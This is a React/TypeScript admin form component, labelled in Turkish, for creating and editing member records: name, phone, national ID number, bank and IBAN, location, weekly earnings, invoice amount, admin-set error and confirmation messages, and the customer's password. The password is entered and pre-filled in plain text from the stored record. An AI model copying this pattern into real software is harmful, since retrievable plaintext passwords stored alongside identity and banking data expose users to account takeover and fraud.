
"use client";

import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { DialogFooter } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import type { AdminMember } from "@/app/dashboard/admin/page";

type AdminMemberFormProps = {
    member?: AdminMember | null;
    onSave: (memberData: Omit<AdminMember, 'id'> | AdminMember) => void;
    onCancel: () => void;
};

const AdminMemberForm = ({ member, onSave, onCancel }: AdminMemberFormProps) => {
    const [formData, setFormData] = useState({
        name: '',
        phone: '',
        password: '',
        iban: '',
        bank: '',
        tc: '',
        il: '',
        ilce: '',
        weeklyGain: '',
        errorMessage: '',
        successMessage: '',
        invoiceAmount: '',
        status: 'Aktif' as 'Aktif' | 'Pasif',
    });

     useEffect(() => {
        if (member) {
            setFormData({
                name: member.name,
                phone: member.phone,
                password: member.password || "",
                iban: member.iban,
                bank: member.bank,
                tc: member.tc,
                il: member.il,
                ilce: member.ilce,
                weeklyGain: member.weeklyGain,
                errorMessage: member.errorMessage,
                successMessage: member.successMessage,
                invoiceAmount: member.invoiceAmount,
                status: member.status,
            });
        } else {
             setFormData({
                name: '',
                phone: '',
                password: '',
                iban: '',
                bank: '',
                tc: '',
                il: '',
                ilce: '',
                weeklyGain: '',
                errorMessage: '',
                successMessage: '',
                invoiceAmount: '',
                status: 'Aktif',
            });
        }
    }, [member]);


    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const { id, value } = e.target;
        setFormData(prev => ({ ...prev, [id]: value }));
    };
    
    const handleStatusChange = (value: 'Aktif' | 'Pasif') => {
        setFormData(prev => ({ ...prev, status: value }));
    };

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();
        const dataToSave = { ...formData };
        if (member) {
            onSave({ ...member, ...dataToSave });
        } else {
             onSave(dataToSave as Omit<AdminMember, 'id'>);
        }
    };
    
    return (
        <form onSubmit={handleSubmit} className="space-y-4">
            <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                 <div className="space-y-2">
                    <Label htmlFor="name">Ad Soyad</Label>
                    <Input id="name" value={formData.name} onChange={handleChange} placeholder="Ad Soyad" required />
                </div>
                <div className="space-y-2">
                    <Label htmlFor="phone">Telefon Numarası</Label>
                    <Input id="phone" value={formData.phone} onChange={handleChange} placeholder="555 555 55 55" required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="password">Şifre</Label>
                    <Input id="password" value={formData.password} onChange={handleChange} placeholder="Müşteri şifresi" required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="tc">TC Kimlik No</Label>
                    <Input id="tc" value={formData.tc} onChange={handleChange} placeholder="TC Kimlik No" required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="bank">Banka</Label>
                    <Input id="bank" value={formData.bank} onChange={handleChange} placeholder="Banka Adı" required />
                </div>
                <div className="space-y-2">
                    <Label htmlFor="iban">IBAN</Label>
                    <Input id="iban" value={formData.iban} onChange={handleChange} placeholder="TR..." required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="il">İl</Label>
                    <Input id="il" value={formData.il} onChange={handleChange} placeholder="İl" required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="ilce">İlçe</Label>
                    <Input id="ilce" value={formData.ilce} onChange={handleChange} placeholder="İlçe" required />
                </div>
                <div className="space-y-2">
                    <Label htmlFor="status">Üyelik Durumu</Label>
                    <Select onValueChange={handleStatusChange} value={formData.status}>
                        <SelectTrigger>
                            <SelectValue placeholder="Durum Seçin" />
                        </SelectTrigger>
                        <SelectContent>
                            <SelectItem value="Aktif">Aktif</SelectItem>
                            <SelectItem value="Pasif">Pasif</SelectItem>
                        </SelectContent>
                    </Select>
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="weeklyGain">Haftalık Kazanç</Label>
                    <Input id="weeklyGain" value={formData.weeklyGain} onChange={handleChange} placeholder="Örn: 1500 TL" required />
                </div>
                <div className="space-y-2">
                    <Label htmlFor="invoiceAmount">Fatura Tutarı</Label>
                    <Input id="invoiceAmount" value={formData.invoiceAmount} onChange={handleChange} placeholder="Örn: 1250 TL" required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="errorMessage">Hata Mesajı</Label>
                    <Input id="errorMessage" value={formData.errorMessage} onChange={handleChange} placeholder="Görüşme hata mesajı" required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="successMessage">Onay Mesajı</Label>
                    <Input id="successMessage" value={formData.successMessage} onChange={handleChange} placeholder="Görüşme onay mesajı" required />
                </div>
            </div>
            <DialogFooter>
                <Button type="button" variant="ghost" onClick={onCancel}>İptal</Button>
                <Button type="submit">Kaydet</Button>
            </DialogFooter>
        </form>
    );
};

export default AdminMemberForm;
